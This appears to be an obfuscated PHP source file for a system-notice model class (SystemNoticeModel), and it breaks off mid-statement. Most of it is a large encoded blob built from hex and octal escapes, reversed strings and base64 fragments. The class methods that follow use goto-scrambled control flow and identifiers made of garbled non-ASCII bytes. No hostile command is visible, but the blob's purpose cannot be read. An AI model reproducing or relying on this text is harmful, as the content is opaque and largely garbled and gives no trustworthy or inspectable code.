\xb1\x50\x2\xf8\x9e"."\xae\x19\x23\xb2\xb\x69\xa\x29\xba\x7d\x39\x62\xe9\x83\x4\x61\xa\xaa\xd2\x81\xd1\x96\xb\x5\x7\x10\x68\x92\x60\xdb\x89\xcc\x3f\x87\xec\x39\x79\x7d\x6\xd9\x2a\x48\xd5\x91\x62\x50\x52\x13\x73\xe0\xca\xd0\x4f\x60\x39\x41"."\120\262\200\211\170\345\212\351\226\343\157\346\370\2\36\247\210\42\52\21\271\100\161\324\145\13\136\31\5\135\170\214\62\335\312\150\377\274\5\64\10\344\355\122\303\24\374\267\161\112\6\274\265\244\351\161".strrev('j'."\n".'¸d‚-õñ1LÁGCÿË&¢€óÎÏ×Ê-¨Pšd*¿Ÿÿ^JÓO—!ÿÃ2$Ï×æÂ‰¦°şO Õ')."\x2\x72\x6a\x57\xbd\x8b\xdf\x97\x20\xb1\x86\xce\xbd\x66\x30\x4b\x4b\x8e\x54\x33\x9c\x6a\x25\x30\xcd\x4a\x8e\x9c\x56\x2\x33\x5a\x75\xe8\xb9\x52\xdc\x91\x1b\x29\x81\x0\x94\x99\x73\x60\x1e\x82\xb0\x2\x44\x42\x63\x2c\x45\xe6".base64_decode('blO60dGULjhkMPHjKuAAainlyBslB5j94P9jJigO/OaALJKDEnoOiOol6hMRLJyKKbu0PPSHD70=')."\xc5\xbb\xc6\xe0\xd1\x9d\x63\x3a\xe1\xba\x1c\x3f\x83\x4e\xde\xca\x33\xb0\x7\xe0\xbf\x2e\x1b\x70\x58\x27\x6c\x82\x1c\xaa\xc5\x4\xf3\x80\xaf\xcd\x22\x6c\x65\xe1\x64\xa1\x24\x5c\x5b\xb4\x87\x11\x66\xe4\x72\x17\x69\x5\x96\x12"."\x61\x82\x83\xc9\x9f\x1c\x8d\x64\x86\x57\x2d\x89\x58\x56\xd3\x46\x8a\x5\x81\x15\xe0\x54\xbc\xcb\x36\x5c\x83\xf5\xd\x53\xd\x43\x2e\x3e\xbd\xff\x1b\x26\x2e\xf6\xbf\x61\x21\xc6\x20\x20\xf1\x9e\xc1\xe8\x28\x3d\xf6\xd5\x55\x24"."\137\22\62\114\361\75\44\347\233\234\137\116\211\374\162\212\60\273\41\213\360\153\47\16\306\165\141\2\354\4\172\26\112\176\313\270\356\240\16\366\214\342\274\252\260\173\40\42\27\145\306\364\111\163\113\105"."\330\344\373\12\54\33\233\267\60\167\13\213\316\261\305\333\262\23\56\3\243\101\301\341\62\176\256\47\62\52\275\165\102\267\46\134\360\57\346\351\326\100\111\12\362\76\175\333\135\170\310\5\264\10\354\320"."\xa0\xd3\x10\x6\x2\x9d\x28\xbc\xdf\x20\x28\x58\x69\x4c\x42\x41\x93\x5\x7\xbb\x2\xc1\x76\xf\xb2\xf3\x8f\x75\x7\xe9\xdb\xc8\xad\xad\xcb\xd0\x91\x31\x7b\xd6\x19\xd0\x8b\x13\x7c\x28\xcd\x9e\x5\x1c\x90\x75\xa8\xc0\xe0\x88".strrev('íç„à004^z'."\r".'—Œ÷XÿÁ!'."\r".'=ID}@À•ğ[¤O1}İ}#ŠŒ1±s‘k]ZJ¤‰5Õ')."\320\320\43\201\336\217\156\207\211\22\144\204\271\326\252\21\55\231\310\152\305\144\25\57\320\335\340\252\227\232\353\33\244\376\74\125\161\244\333\43\372\50\170\136\163\12\217\347\331\236\5\267\46\132\36\210"."\245\37\307\111\140\57\1\310\112\330\61\7\113\212\56\150\353\23\103\102\77\371\355\11\256\42\132\270\35\301\76\162\176\320\263\222\351\241\170\225\2\25\232\73\312\136\321\105\252\63\343\271\354\22\246\230"."\x23\x9c\x8a\x2e\xf5\xb6\x14\x74\xad\x90\x52\xf3\x49\x9\xe0\xe4\x8d\x16\x6f\x6b\x95\xd7\xb3\xaa\xa5\x6a\x19\x48\x92\xb3\x59\x98\x2a\xb9\x97\x2d\x75\x73\x44\x32\x62\x7d\xa1\x60\x5f\xa7\x9f\x79\x49\xe8\x83\x43\x40\x8e\xc7\xc8"."\xcb\xe2\xf4\x91\x78\xf2\x29\x8b\x9e\x76\x15\xe8\xe9\x2a\xae\xa7\x5d\x85\xea\x54\x25\x51\x9f\x69\xc8\xf2\x5\x7\x1b\x1a\x89\x97\x3e\xd1\x24\x94\xe8\x3a\x42\xd3\x2e\xa1\x1f\x60\x94\x59\x87\x20\x2\xf1\xfa\xa0\x31\xbc\x40\x1e"."\31\166\12\156\63\111\300\100\142\25\327\55\132\305\201\216\200\353\23\274\41\207\275\12\73\46\1\325\205\320\244\301\135\143\111\147\271\322\212\111\156\145\21\34\326\56\351\206\353\216\23\277\226\256\351\23"."\x30\xb3\xd\xad\xe2\x47\xa9\xd6\x13\x32\xa4\xe7\x77\xcc\xe4\xea\x9a\xcc\x72\xc1\xa8\x96\x1b\x4\xc7\x99\xa1\x0\x28\x12\xdd\xd7\xd9\x6\x9a\x44\xc3\xad\x55\xc4\x6a\x8e\xce\xb\xc8\xc\xab\x96\x61\xbe\xb7\x34\xdc\xa2\x8c\xc3"."\x41\x5\x4d\x5e\x16\x44\xf\x17\xf7\x6a\x26\x52\x7b\x5a\xea\x16\xd3\x0\x22\xe0\x1a\x6\xd8\x0\x2f\x63\xc3\x5\x31\x28\x10\x15\x7\x5b\x8d\xaa\xb2\xcc\x4a\xb4\x70\xbf\xde\x22\xb1\xe7\xa6\x39\xc5\x16\xcd\x14\x21\xd8\x55\xb2"."\x3e\xd1\x22\x55\x78\xb6\x3a\x5b\x51\xc7\xdb\x44\x25\x12\x26\xd6\x13\xa9\x38\x69\xa1\xc9\xf\xa8\x5a\xeb\xa2\x5\xcd\xf5\xf5\x8e\x5c\xd1\x30\x9d\xba\x62\x7d\x45\x14\x76\x94\x44\xce\xf\x7b\xc2\x4e\x3c\xb1\x9d\xab\x54\xc0\xf"."\274\324\170\30\275\36\336\42\221\211\340\220\350\374\300\241\76\117\244\243\333\41\41\142\165\110\135\276\10\0\367\203\177\260\206\275\103\202\363\32\44\203\171\356\220\240\351\256\103\352\357\305\277\134\73\32"."\xf4\x1d\x26\xb\x64\xdb\x82\xba\x12\xc4\x21\x45\x53\xa2\x71\x93\x28\x49\x82\x33\x16\xaa\xc7\x90\x5e\xc7\x0\x3a\xa2\xb9\x96\x1\x35\xdf\xd4\x8\x95\xa3\xb1\xf5\xe\xdc\xa7\x13\x62\x0\xdc\xb1\xa8\xe7\x5b\xb0\xab\x1f\xc3\x99".base64_decode('UxNgVQcrqhOQRAvUwbOWQS8y//8lwFpQDe3/fylQZcJjgkUmXjQV438qgzI41lVYrWgZWRUapMY=').strrev('&§)%†“[…ˆƒ—Y®Ü<$>F#Ê/gš™\'4§}å$g¨„ÇƒãÀ/	“´\\…½”‘¢¸)zú').base64_decode('ow2Vy5NwkwHyTrB2wLW9pMA02lkYE7OyZAv6CuZiDGxBBAViTDDJs0UDFMaxcRpDT8J1aJmah88=')."\232\232\210\267\141\10\103\320\306\362\12\235\364\60\77\64\157\163\43\240\233\63\146\230\17\43\262\174\304\47\344\62\77\56\132\201\50\24\146\155\25\64\146\132\106\147\205\126\220\107\213\12\203\267\330\146".base64_decode('CWszysTIwNZjFMvStYxccJHwZTFnBH2DM6A8XiFaJOjq1wn4SamMJZfRAhzQaXnitIv4V66sWAs=')."\227\56\254\210\330\160\160\265\323\67\136\0\165\124\222\140\245\6\33\366\11\213\235\254\173\55\66\205\300\327\166\165\265\116\32\140\76\176\310\55\17\61\247\57\241\145\212\60\151\50\215\222\160\11\314\7".base64_decode('6Aw02WAHNFJsLZWCxxEkRrDQfpJmwZtFGitk5bxCX5IvgayiYLtKzLjKmpGh0mThbF2segzbCBI=').base64_decode('yHisoGTxYQmy3qLwiWngiawOnYklxbiag1eMMqukDkR2wI1GKE5aV5S8BRLPFhULQM4WMjKCYAA=')."\171\263\240\43\356\356\110\273\73\164\167\7\331\152\177\3\377\174\223\44\223\125\213\270\111\242\57\35\240\6\342\235\64\164\340\222\126\123\25\341\360\152\256\142\102\201\112\165\143\134\143\47\43\350\322\10".base64_decode('6PCyGt1JCCkhzWRrKzepQUmpLFXz8vd0xToD/r4YEvGDvRFPwJYAeGbE31EGbg9SF662WsdzVjU=')."\64\65\217\226\371\76\356\212\6\275\163\317\134\230\22\317\200\44\17\324\351\307\301\45\113\343\272\233\132\7\306\205\15\217\221\223\263\114\241\311\115\365\314\335\106\21\207\250\267\222\200\237\314\35\67\331".base64_decode('3wXUOBnmvo7AsaAJ0KlEMOQJreHOakFKxBOaJgXmIT7hqJuyJcuXL6fvVSay2JwQ6vaz+3IAhac=')."\x4f\x4a\x39\x54\x2e\xc7\x84\x6a\x79\xc8\xd4\xc7\x72\xdf\x1e\x92\x75\xf\x6e\x41\x85\xc4\x63\xd5\xc2\x34\x89\x6a\x41\x26\xdd\x5d\xa0\xea\xe5\x85\x22\xbd\xcc\x66\xc7\x69\x82\xb\x99\x85\xe4\x77\x9c\xfc\xc6\x27\xa9\xe3\x7f\x9d".base64_decode('6A4kZJJfNcj5WHoSqr7RMFhpsvwcEykDD0kdcr7alIIAbYnUA22N8mlpErQceyc2uOMLI6NkszE=')."\250\362\106\252\233\310\150\222\175\3\111\243\323\177\203\27\103\300\105\252\257\1\231\47\250\40\231\124\144\46\13\267\375\334\315\3\61\165\163\271\210\22\17\364\16\0\230\211\25\11\71\242\244\146\377\350".base64_decode('2CAG+JzgrxBKShJcWpD5gsW1ykotSYatBftTSSrjSyTkLIj4mK7snwd9RgKfgdZcEjZKtSgIYoQ=')."\62\110\213\105\317\20\47\224\127\170\156\175\103\275\140\212\341\357\360\205\143\53\302\320\365\145\300\117\135\265\130\23\374\40\55\22\232\46\305\23\232\56\45\330\276\142\232\224\16\272\177\260\246\4\202\301".strrev('CXpÌŒ’¼&&û¿¿‡JÔÍõ¹Å¢›ÔAÜ^'."\n".'Šÿöö‚h»µÃÙßÁ>ş½VÈè°').base64_decode('OzQclhIytmaJK1gqUJLQ1yesnWQAWZly8tnQka/bXeOaVztndk6EResgMFrnnt1PqjGbwwDCHAY=')."\x77\xaf\xad\xa9\x9a\xaa\xae\x75\xd5\xd5\x44\x1b\x6a\x99\xfa\x56\x94\x5a\x89\x45\xa3\x45\xa2\xfc\x34\xb4\xbe\x79\x3\x77\x2b\x18\x1d\x74\xd5\x45\x87\xe6\x8\xda\x64\xeb\x1\x60\x3\x3\x8c\x65\xe8\x79\x18\xf2\xd6\xc0\xb0\x8c"."\272\232\301\252\352\41\127\335\340\332\150\164\10\6\153\1\254\5\302\243\141\127\135\255\243\155\216\273\137\65\104\174\354\34\171\132\34\322\345\324\116\254\300\16\367\241\310\242\202\135\22\62\201\20\365\151"."\373\174\200\51\13\256\327\314\134\101\40\133\350\35\154\101\263\250\121\216\41\204\151\101\125\131\41\110\255\256\12\134\263\336\252\114\313\242\226\331\122\57\265\3\121\315\142\1\154\361\17\47\324\116\237\47"."\x14\x14\x13\xbd\x22\x22\x88\xf8\xba\x5\x8c\xb\xcf\x7d\xa\x75\x5\xf2\x9a\xe0\xc8\x4\x16\x44\x1d\xfd\x60\x18\x74\x7\x30\x8d\xe7\x1b\xec\x84\x2\x34\x40\xa8\x13\x62\x2d\x2e\xb8\xe1\xa7\x45\x82\x85\xb6\xdb\xe6\xc1\x89\x6c".strrev('2|I5÷€\\„¤EJ4XZàšH0:å°¬âC2¶c°ÒqcâŠàæú†¾Ğ§Àğ…©“!‡ûÊ£')."\16\72\236\174\233\205\372\373\240\337\64\310\11\142\364\14\125\0\371\173\375\261\260\377\130\137\131\2\164\363\133\71\5\254\367\21\77\25\177\4\170\157\20\271\52\263\300\373\173\127\366\6\7\52\241\106".strrev(' ó{—ıÓõ)“¸À-Üù¬Še3\'–T^1šlãš\'¡=‹T+vÅË`+7ŠOa1#zxu$!,¸úz').strrev('×wˆ*3“ ÂDpt˜çoÑÍ*:™y«Œ;nŠR7œºT6Ã†xªC²b8§ˆ2Bmò©+ÁĞÙ')."\x5\x76\x1\x48\xec\xbc\x74\x90\xaa\x27\xa1\x51\x92\x70\x66\x97\x37\x43\x4a\x5a\x8c\x6\x34\xa6\xb3\x87\x56\xf3\xa\x45\xc0\x17\x64\x4\xdb\x12\xb8\x49\xf1\x24\xcc\xa2\xf8\x52\x8d\xf0\xbe\x37\x88\x9\x6f\xad\xb\xf6\x75\xce".base64_decode('Bom1KIZLxpF5QgLWFK9go2ez70dGr3jyQr+5+XAxzny32IzqqDdQSTRno/4+YQHo8RTYAkNMA8U=')."\302\347\175\171\313\304\54\350\233\145\131\160\32\264\72\343\254\114\114\61\240\102\126\77\25\273\52\245\124\370\24\112\22\172\64\101\367\161\144\51\42\235\270\206\367\225\111\373\273\321\111\337\235\322\104\57"."\x6e\xd8\x66\x8d\x74\xae\xb3\x51\x12\xc8\xb\xf2\x1e\x81\x22\xf0\x69\x4\xeb\x46\x6e\x85\x99\xe5\x38\x1a\xf4\x4b\x20\x98\x26\x71\x2b\x3f\xfc\xec\xb\x1b\x5a\xf4\x3e\xc\x8b\xe9\x82\x5\x98\x92\xa4\x43\x87\xde\x57\xa9\xb8\x96"."\x60\x20\x7a\x80\xa5\xa2\x8d\x14\xee\x2c\x98\xec\xb5\x78\x85\xb4\x21\x80\x29\x6f\x4d\x27\xaf\xb4\xb\x95\xb1\x66\xd0\xb1\x97\x3c\xf1\xd\x7a\x94\x85\xd7\x99\x3b\xd3\x4\x20\xd\xbf\xfb\x2e\x74\x2\xf7\xb5\x86\x1f\x8f\xa1\x3e".base64_decode('QD3JpB0c0Riw3F+bi3kvJd7TwQY07A/21tRCicpi3t8zwfxbg1FDa3aPPM4HhUVoKqNJwxLB3gc=')."\55\271\31\210\141\215\51\204\371\262\35\126\137\167\237\233\201\332\151\67\261\347\114\210\65\63\164\46\57\26\32\44\362\351\30\66\201\302\221\216\26\346\220\221\156\177\306\162\152\102\12\4\273\340\336\333"."\353\17\257\224\322\212\51\161\241\7\135\122\130\147\71\362\315\200\16\365\50\221\307\251\12\13\12\72\321\1\210\323\342\22\207\355\110\104\117\215\260\240\262\202\361\250\213\305\301\323\23\147\222\131\267\332"."\x70\xa9\x90\x50\x96\x43\xfc\xbe\x90\x7\xee\x68\xac\x7c\x1\x81\xc9\x5e\xc7\x5a\xce\x84\x2\xef\x1\x2a\x7f\xbb\x58\xe1\xbb\x4\x3f\xcb\xcf\x4e\x84\xc\x6a\xbe\xa4\x1a\x2a\x9f\xf2\xb4\xab\x26\x44\xfc\xb2\xbe\x44\x4d\x11\x10"."\xa0\x83\x2c\x6e\xf2\xcd\xba\x95\x7d\xa7\xcc\x14\x99\xc7\x31\xe\x79\x84\x4a\x30\x7a\xc5\x43\x22\xbe\xcd\x26\xac\x6\xd0\xe1\x0\x58\x6a\xb9\xae\x5b\x81\xba\x48\x21\xd7\xeb\x94\x36\x48\x54\xb8\xa9\xb6\x3c\xe2\x46\x92\xc1\x4e".strrev('@‚Š;÷vô½øwœ	Š‚u,vµ‡•?\\È´©&£*Ù´/äš¶\\WLêïä#°ã©)VP').base64_decode('dMDjLVQBB7+ij6FLYjKtVA1ZnhLzTQzzB2NIKCVRt11ETiHbUGRdJDjgcdMjR+Y0Gp48+8ZJ1V0=')."\x26\xd\x41\x30\x37\x36\x85\x19\xe9\x43\x52\xb4\xb2\x38\x6a\x77\xa3\x9a\xb1\xc8\xc8\xe5\xb8\x20\x4d\xe2\x36\xf1\xc\x41\x6a\x95\xea\x91\x6b\x5\xac\x4f\x83\xee\x77\x96\x52\x7\xf1\xb0\xf1\xd8\x4e\x19\x3d\xa6\xe5\xcb\x15\x4c"."\213\15\163\267\152\360\207\36\220\230\300\267\103\120\366\322\162\23\145\0\213\221\174\200\126\203\171\372\204\146\44\371\224\46\266\14\261\54\37\140\15\16\24\302\266\321\16\170\122\155\366\41\42\10\50\45"."\305\232\175\332\262\14\73\257\147\174\332\302\30\121\104\240\43\144\224\52\70\112\247\277\320\103\15\223\57\141\125\4\101\204\130\55\105\311\57\345\201\366\242\301\330\164\20\255\20\112\200\60\132\226\330\243"."\160\65\64\122\127\7\147\353\370\66\32\200\0\33\100\226\70\2\105\323\64\141\370\261\72\172\10\373\25\164\141\217\25\123\104\356\110\253\314\171\250\5\215\220\73\330\42\360\303\102\233\157\25\14\44\176".base64_decode('Vop5P3YXb4Hqgngt+pzFHlu4W2+CDr7Wh73MkAkpFkmd+aAfKIADemW2ze5y5z/Q7+EUFR+4n9A=')."\x11\xd\x49\xb1\x2e\x51\xfe\x25\x8\xd2\x52\x89\xce\x17\xc3\xb4\xd0\x11\x14\x39\x80\x34\xe2\x40\x1\x44\x9c\xa2\x90\x54\x19\x6a\x21\x4e\x84\xc2\x6\xc\xbd\xf1\xc7\xc6\xe\xf6\x28\xf9\xf1\x2a\x29\x26\x3e\xc2\x38\xdf\x67\x88"."\xf\x62\xd0\x26\x60\xc2\x28\xfb\x6\xfa\x85\x9b\x68\x7\x6e\xa3\x83\x91\x8b\x6a\x4\x90\x7a\xa1\x11\xc6\x2\x96\x83\x7b\x66\x77\xe0\xb3\x79\x64\xc4\xc2\x99\x3\xef\xe\x4a\xf6\x69\x85\x7f\x10\xd6\x30\x22\x7e\xdc\x22\xc9\xd9".base64_decode('hTjWS7YMIXtPRrRyhwjc21G+mONupUDEKsBi0Z66kviK5hb1rAOpxjroM3EO/E6ow1IEqlDMFBo=')."\314\244\51\333\160\225\175\354\153\224\116\274\312\42\201\26\210\6\330\303\4\116\152\101\27\33\225\321\124\13\135\202\335\43\77\62\306\257\110\26\354\214\162\115\56\331\330\64\177\261\270\137\344\303\310\35"."\xd7\x90\xa3\x7c\xa2\xe5\x43\x8f\xc6\x18\x61\x48\x53\x16\x3a\x93\xe8\xd3\x95\xe2\xcc\x46\x89\x56\xe7\xb8\xe4\x3d\x51\x81\xb\xda\xf8\xd7\xd7\x9a\xe\x9e\x4a\xe2\x26\xce\x24\x9c\x60\xb1\x92\x85\x2e\xa8\xf4\x95\xff\x7f\x3d\xac"."\x4e\xce\xc8\x3e\xd0\xcb\x64\x4c\x41\x30\x14\x45\x58\x5e\x7b\xfc\xcc\xe2\xd7\xff\x3e\x15\xd8\x64\xab\xf\x2b\x94\x6a\x9d\xfa\xc2\xb1\x83\x62\x6\xa1\xa1\x3b\x19\x13\x41\xda\xe7\x4f\x2b\x9\xeb\x1b\x2c\xcb\x23\x8a\xb0\xe5\x22"."\70\235\71\134\307\11\371\202\347\156\62\20\221\130\10\106\170\223\124\164\255\216\12\212\240\106\116\127\64\332\3\222\372\22\212\101\227\345\310\57\234\247\213\171\313\207\27\211\274\12\60\306\331\204\251\361"."\24\123\360\343\16\31\113\220\236\232\201\115\244\105\244\4\161\156\165\44\320\175\322\6\244\75\0\253\54\314\43\100\337\252\40\26\22\171\211\13\40\250\241\202\43\37\262\115\345\75\345\41\23\46\351\20"."\x5f\x62\x5\x51\x46\x28\x84\xa3\x93\x99\x87\x1c\xe7\xe2\xcf\xa\xfc\x9b\xd6\x2e\x2d\x84\x7a\xa9\x62\x3e\x8c\x8\x7\x32\x48\x8c\x63\x89\x19\x51\xc2\x83\xf\x3\x4d\x59\x84\x1a\x56\xb\xc4\x65\x2a\xd1\x2c\xae\x4\x24\x44\xb2"."\210\240\40\345\154\120\163\27\31\314\302\74\244\367\254\63\25\65\350\53\126\42\130\34\163\334\114\42\242\33\171\141\245\23\231\351\114\61\225\120\226\303\22\43\21\56\142\41\75\150\341\116\7\305\231\77".strrev('ÙpTŒM^@o"§AY[ªğº“° u—#Õ|[Œå›%>gÁ¯¶; [^fIü}ÊúN')."\xfb\x1f\xea\xc8\x8\x3c\x53\x58\x69\xca\xd0\x38\x4f\x1\xb\x12\xd3\x6d\xa3\x21\x24\xbb\x42\x19\x85\x3c\x40\x6d\x79\x4a\x21\xc8\xee\x7c\x6b\x89\xbb\xb7\xa1\xe5\x94\x21\xc0\x59\x48\xf\x93\x44\x5e\x60\x1\x95\x71\x90\x88\x85"."\171\133\200\25\210\0\372\112\247\364\140\311\1\235\3\265\13\102\60\106\242\117\374\21\217\114\2\313\52\367\340\124\236\233\315\111\61\13\147\372\70\36\3\25\265\356\56\305\242\361\75\55\334\101\205\340"."\146\307\145\53\236\115\242\212\23\107\65\360\231\234\270\21\0\41\261\242\164\346\365\351\32\132\216\255\120\266\45\23\354\205\4\135\236\260\235\167\231\232\245\217\200\364\54\234\227\343\147\22\361\273\324\360"."\215\67\300\301\244\160\177\117\15\162\172\15\1\310\157\16\172\152\153\35\221\16\326\111\173\113\302\177\370\301\265\32\230\14\13\131\47\371\173\371\223\267\265\22\177\50\114\174\374\32\36\50\165\152\214\16".base64_decode('rD77oUNdK9Evq4SW0HRDQBPeGzoGeh/HwR41T5+KILRMs5OuF1+Zt5YPRjpsWsaEP/5tf/Qb7bc=')."\360\26\312\262\223\42\72\63\42\110\70\363\201\212\341\126\177\252\50\21\201\351\133\212\244\4\341\340\332\172\205\300\136\175\56\143\124\105\65\40\44\243\134\364\11\57\360\13\335\371\373\271\347\4\224\214"."\217\332\74\45\231\351\223\330\163\365\133\304\121\341\302\41\201\50\220\357\31\120\306\70\250\45\372\307\123\120\355\71\314\214\252\47\333\325\174\322\216\137\314\307\31\224\243\203\301\150\257\4\6\2\23\347".base64_decode('1Ta4sKxwbimX+IE0FxCTyU65VAGV2TkzKIAwVCT9CK+OcEe8ypj4dYKXKl9UIGI5lL9KYm8Xmjc=').base64_decode('DE7uAPKCCzRCbhyEX4VnPu5wUbqGMspJ7vwO15Ht5fgnrY+nMDQmmQEcpDHutEBtvoDhsRZdXm0=')."\x49\x64\x23\x29\x14\x5f\x71\xbf\x69\x21\x85\x80\x50\x9c\x78\xd\x31\x6d\x86\x70\xe5\x8f\x70\x7a\xb5\x76\x71\xd8\x76\xf9\x61\x63\xa1\x1c\x99\xae\x6c\x62\xc9\x16\x6\xcb\x1a\x4b\x30\x43\x62\xa2\xa5\x8a\xf6\xe1\x46\x52\x3f\xa7"."\125\14\314\241\303\46\234\346\261\46\141\174\305\326\42\61\203\275\265\70\207\136\326\147\44\117\345\117\333\77\100\273\314\176\11\310\13\21\216\336\312\156\50\43\132\205\74\270\106\25\263\341\44\230\223\213"."\x6e\x96\xbc\xc6\x98\x6a\x26\x32\x15\xf3\xe2\x24\x98\xb7\x2c\x99\x66\x16\x76\xc7\x42\x3e\x53\x2e\x1a\xd3\x34\xaf\xbc\xf3\xd0\xd4\xb2\x75\x1d\x69\x30\x77\xe2\x2d\xa0\x4e\xd7\x9f\x15\x91\xcb\x3f\x47\x88\xc7\x8e\x8d\x76\xbc\x95"."\153\121\161\167\76\135\55\52\42\117\133\13\216\155\273\214\254\304\43\151\112\5\256\310\357\16\313\371\57\117\253\160\223\211\313\204\213\163\310\242\330\127\226\54\136\213\126\276\70\15\125\234\305\206\365\106"."\323\6\27\73\206\252\150\274\171\302\306\235\233\317\364\367\111\64\40\202\55\134\273\230\37\311\123\337\107\340\13\334\247\40\264\157\364\350\366\376\233\42\62\240\315\275\56\45\317\174\121\160\351\132\321\77".strrev('»¤*Ş.ZEİP|*¶¨ÁúŠó\'¾"Ó?,‘útâğ'."\n".'…&©š,wŒ^ôKêY£7Ë•î¯')."\xf8\x19\xa7\xc5\xbd\x33\x7a\x98\x8b\xd9\x7c\xe3\x15\x9d\x9c\xf2\xe2\x3b\x9\xa4\xfb\x42\x20\xed\x13\x70\xc3\xe5\xc0\xb\x25\x4e\xe\x6b\xba\x9\x6d\xc1\x1\x33\x2f\xa0\xdf\x76\xcd\x34\x29\x8f\x1\x62\x31\xc2\x44\x72\x1f\x72"."\x35\x23\xdc\xb4\x82\x10\x7f\xf9\x14\xf6\x2d\x3a\x60\x46\x84\x8a\x18\xa\xa\x92\xdb\x11\xb8\x39\xd\x2b\x38\x15\xb1\x21\x4b\x4\x1e\x5c\xb3\x48\xa8\xfc\x84\xba\xb3\x68\xbb\x8e\xe1\x0\xb0\xad\x8c\x6b\xe3\x84\x8\xd0\x9b\x2a"."\xbc\x3e\xf0\x84\x99\x74\x8b\x5d\xb6\xe3\xaf\x8\x10\x2a\x14\xef\x8d\x91\xb2\x96\xe1\xc6\x29\x6e\xa2\xd8\xed\x44\x65\x38\xc9\xc3\x7b\x4c\xb1\x8b\x64\x4f\xa2\x89\xc5\x9c\x55\x7e\x55\x9\xe4\x40\x8e\x17\x81\x5f\x77\x46\x47\x47"."\xf0\x51\x74\xdf\x6a\x7f\x38\x12\x2e\x4b\xea\xf3\x84\xc3\x3\xc1\x90\x17\x2b\x87\x96\x25\xa3\x5c\xc2\x25\x7d\x59\x52\x5f\x77\xb0\x77\xba\x34\x5f\x8f\xc7\x1f\x28\x4b\x83\x97\xf6\x50\x65\x95\xbe\xd\x89\x93\xfc\x7d\xa8\x96\x9e"."\100\200\152\210\225\327\302\337\261\222\327\4\335\125\361\223\325\102\106\243\7\225\66\355\25\172\20\35\226\351\64\201\314\237\155\215\205\260\222\143\307\130\102\161\326\363\4\161\310\15\372\166\51\13\24\312"."\266\37\202\224\0\57\331\173\111\141\41\352\223\21\76\224\315\246\77\23\205\121\343\104\155\35\176\63\347\262\334\340\11\160\64\161\20\23\22\10\122\134\203\21\200\150\227\332\156\120\154\235\51\254\350\345"."\167\160\10\302\73\4\326\173\5\365\311\60\254\305\205\263\131\314\247\54\34\112\124\223\300\141\33\3\113\106\264\210\234\46\174\5\112\45\74\326\76\41\206\305\203\217\145\214\255\230\162\232\136\204\333\131"."\261\160\363\13\173\351\377\0\216\365\142\237\105\302\0\0", 10, -8))); goto e‹Ôçğö‚¾; BŒÇ¦¬Â»…: class SystemNoticeModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\155\56\x6e\x6f\x74\151\143\x65\x4c\x69\x73\164"; public $field = array("\156\141\155\145", "\143\x6f\x6e\x74\x65\156\x74", "\141\165\x74\150", "\155\157\x64\x65", "\164\x69\x6d\145", "\164\x79\x70\145", "\x6c\x65\x76\x65\154", "\145\x6e\141\x62\x6c\x65", "\x73\157\x72\x74"); public function listData($aİèô‰½Õ = false, $D¦Û×Å‚Œ† = "\x73\157\162\164", $C »ë³¶Ââ = false) { return parent::listData($aİèô‰½Õ, $D¦Û×Å‚Œ†, $C »ë³¶Ââ); } public function add($e¯êÌ‘Ñëé) { goto eÎÑØ·šøÎ; f‘ŒŒå÷à : $E¢çæ„¶¿– = time(); if ($e¯êÌ‘Ñëé[$f¦ÓˆÄˆô¤[12]] == $f¦ÓˆÄˆô¤[2428]) { $E¢çæ„¶¿– = strtotime($e¯êÌ‘Ñëé[$f¦ÓˆÄˆô¤[196]]); } $e¯êÌ‘Ñëé[$f¦ÓˆÄˆô¤[196]] = $E¢çæ„¶¿–; goto eí…œ–¨ŠÎ; eÎÑØ·šøÎ: $f¦ÓˆÄˆô¤ =& $_SERVER[ºÖÙÂŒäÉê‡]; $f¹éõ‘± = $this->findByName($e¯êÌ‘Ñëé[$f¦ÓˆÄˆô¤[28]]); if ($f¹éõ‘±) { return !1; } goto f‘ŒŒå÷à ; eí…œ–¨ŠÎ: return parent::insert($e¯êÌ‘Ñëé); goto c‰ëöÀ¨ŸÃ; c‰ëöÀ¨ŸÃ: } public function update($dÓˆÈé¹ò‰, $AÏ³è—¹Õ) { goto E–¯ÚÄĞÛ; fÒœÅİÉéÖ: $AÏ³è—¹Õ[$BĞ¾„Â‘²Ÿ[196]] = $A ™‡„”‡½; return parent::update($dÓˆÈé¹ò‰, $AÏ³è—¹Õ); goto CÇ½±ò˜Å; a‡øğîéƒ: if (!$fçÍöæõà“ || $bø¼¦î¯» && $bø¼¦î¯»[$BĞ¾„Â‘²Ÿ[372]] != $fçÍöæõà“[$BĞ¾„Â‘²Ÿ[372]]) { return !1; } $A ™‡„”‡½ = time(); if ($AÏ³è—¹Õ[$BĞ¾„Â‘²Ÿ[12]] == $BĞ¾„Â‘²Ÿ[2428]) { $A ™‡„”‡½ = strtotime($AÏ³è—¹Õ[$BĞ¾„Â‘²Ÿ[196]]); } goto fÒœÅİÉéÖ; E–¯ÚÄĞÛ: $BĞ¾„Â‘²Ÿ =& $_SERVER[ºÖÙÂŒäÉê‡]; $fçÍöæõà“ = $this->listData($dÓˆÈé¹ò‰); $bø¼¦î¯» = $this->findByName($AÏ³è—¹Õ[$BĞ¾„Â‘²Ÿ[28]]); goto a‡øğîéƒ; CÇ½±ò˜Å: } public function remove($aÙ¢ï˜÷²Š) { $F™ÃÛ—¨Õ— = $this->listData($aÙ¢ï˜÷²Š); if (!$F™ÃÛ—¨Õ— || $F™ÃÛ—¨Õ—[$_SERVER[ºÖÙÂŒäÉê‡][1070]]) { return !1; } return parent::remove($aÙ¢ï˜÷²Š); } public function sort($e„İš¶Í‚, $BáŒ÷†ÙØÌ) { return parent::update($e„İš¶Í‚, $BáŒ÷†ÙØÌ); } public function enable($cá¿‡•„µš, $cİÅÓîÚŞö) { return parent::update($cá¿‡•„µš, array($_SERVER[ºÖÙÂŒäÉê‡][2429] => $cİÅÓîÚŞö)); } private function initUserOption() { $BŠâÙ†¹È =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->optionType = $BŠâÙ†¹È[2430]; $this->modelType = $BŠâÙ†¹È[2431]; $this->field = array($BŠâÙ†¹È[2432], $BŠâÙ†¹È[28], $BŠâÙ†¹È[196], $BŠâÙ†¹È[29], $BŠâÙ†¹È[2433], $BŠâÙ†¹È[686], $BŠâÙ†¹È[189]); } public function userNoticeGet($a»–ö¶ìˆ = false) { $this->initUserOption(); return parent::listData($a»–ö¶ìˆ, $_SERVER[ºÖÙÂŒäÉê‡][372], !0); } public function userNoticeAdd($cÚ“ˆƒœØº) { $AÌæ„İö¬™ =& $_SERVER[ºÖÙÂŒäÉê‡]; $this->initUserOption(); $AÄÉ’İ™åİ = 